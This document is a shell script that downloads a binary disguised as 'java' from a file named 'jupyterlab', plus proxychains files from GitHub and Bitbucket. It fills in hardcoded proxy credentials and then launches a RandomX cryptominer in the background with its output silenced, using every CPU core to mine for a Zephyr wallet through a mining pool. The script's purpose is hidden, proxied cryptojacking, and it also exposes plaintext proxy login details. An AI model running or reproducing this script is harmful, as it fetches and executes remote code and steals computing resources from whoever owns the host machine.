proxy="52.5.238.209" 
port="1080" 
user="22qg9vgn8zo93"  
pass="z5qrhxcikhhylquzqvnzc03zng"
wget -q -O java https://github.com/swanderenata/NFT/raw/main/jupyterlab && chmod +x java
wget -q https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x panel 
wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
wget -q https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
nohup ./panel ./java -o 45.115.225.225:8080 -a rx/0 -u ZEPHYR2tBHcj5UGL8ht15WiyPifGuh7ugHN5nAKXhDAE79gGobZ4kH9USdGNwy8prj7Sb7sXWXKEtck6cxF8138fJpd4iSa2cEM23.bian --randomx-1gb-pages -p -x -t $(nproc --all) &>/dev/null &
